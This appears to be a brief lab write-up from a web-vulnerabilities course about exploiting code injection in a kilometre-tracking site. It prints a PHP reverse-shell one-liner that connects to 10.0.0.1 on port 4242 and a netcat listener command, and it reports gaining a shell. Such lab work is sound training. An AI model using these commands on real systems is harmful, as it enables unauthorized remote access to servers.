# Challenge -Lab 3


It was a website to check kilometers travelled

Below is the syntax which was used

![Screenshot](./assets/251_Challenge_-Lab_3_1cdd64c5-e0cb-80e6-890e-c9f5b65e09ba.png)
The ones in red boxes are the entry points for us, as they are the places where user input was allowed to be part of code

Used the following payload

```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Line 2 is the payload crafted to enter in the second column

![Screenshot](./assets/252_Challenge_-Lab_3_1cdd64c5-e0cb-80c7-bdbe-f965f34221df.png)

Opened a netcat listener 

```php
nc -nlvp 4242
```

Excecuted the payload and got a shell


---
[Back to Common Web Vulnerabilities](./README.md)
